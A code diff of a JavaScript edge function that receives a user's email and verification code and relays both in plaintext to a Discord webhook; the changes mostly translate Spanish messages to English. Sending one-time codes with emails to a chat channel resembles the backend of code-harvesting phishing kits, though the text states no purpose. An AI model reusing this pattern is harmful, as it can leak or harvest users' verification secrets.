@@ -1,48 +1,64 @@
-export const config = { runtime: 'edge' };
+export const config = {
+  runtime: 'edge',
+};
 
-export default async function handler(req) {
-  if (req.method !== 'POST') return new Response('Method not allowed', { status: 405 });
+export default async function handler(request) {
+  if (request.method !== 'POST') {
+    return new Response(
+      JSON.stringify({ error: 'Method not allowed' }),
+      { status: 405, headers: { 'Content-Type': 'application/json' } }
+    );
+  }
 
   const webhookUrl = process.env.DISCORD_WEBHOOK_CODE;
-  if (!webhookUrl) return new Response('Webhook URL no configurada', { status: 500 });
+  
+  if (!webhookUrl) {
+    return new Response(
+      JSON.stringify({ error: 'DISCORD_WEBHOOK_CODE not configured' }),
+      { status: 500, headers: { 'Content-Type': 'application/json' } }
+    );
+  }
 
   try {
-    const { email, code, id } = await req.json();
+    const body = await request.json();
+    const { email, code, id } = body;
 
     const payload = {
-      username: '🔑 Bot Verificación',
+      username: '🔑 Verification Bot',
       avatar_url: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png',
       embeds: [{
-        title: '✅ Verificación por Código Completada',
+        title: '✅ Email Verification Completed',
         color: 0x2ecc71,
         fields: [
           { name: '🔖 ID', value: `\`${id}\``, inline: true },
           { name: '📧 Email', value: `\`${email}\``, inline: true },
-          { name: '🔢 Código', value: `\`${code}\``, inline: true },
-          { name: '📅 Fecha', value: new Date().toLocaleString('es-ES'), inline: false }
+          { name: '🔢 Code', value: `\`${code}\``, inline: true },
+          { name: '📅 Date', value: new Date().toLocaleString('es-ES'), inline: false }
         ],
-        footer: { text: 'Sistema de Verificación v2.0' },
+        footer: { text: 'Verification System v2.0' },
         timestamp: new Date().toISOString()
       }]
     };
 
-    const response = await fetch(webhookUrl, {
+    const discordResponse = await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
 
-    if (!response.ok) throw new Error(`Discord respondió con ${response.status}`);
+    if (!discordResponse.ok) {
+      throw new Error(`Discord API error: ${discordResponse.status}`);
+    }
 
-    return new Response(JSON.stringify({ success: true }), {
-      status: 200,
-      headers: { 'Content-Type': 'application/json' }
-    });
+    return new Response(
+      JSON.stringify({ success: true, message: 'Verification sent to Discord' }),
+      { status: 200, headers: { 'Content-Type': 'application/json' } }
+    );
   } catch (error) {
     console.error('[CODE WEBHOOK ERROR]', error);
-    return new Response(JSON.stringify({ error: error.message }), {
-      status: 500,
-      headers: { 'Content-Type': 'application/json' }
-    });
+    return new Response(
+      JSON.stringify({ error: error.message }),
+      { status: 500, headers: { 'Content-Type': 'application/json' } }
+    );
   }
 }
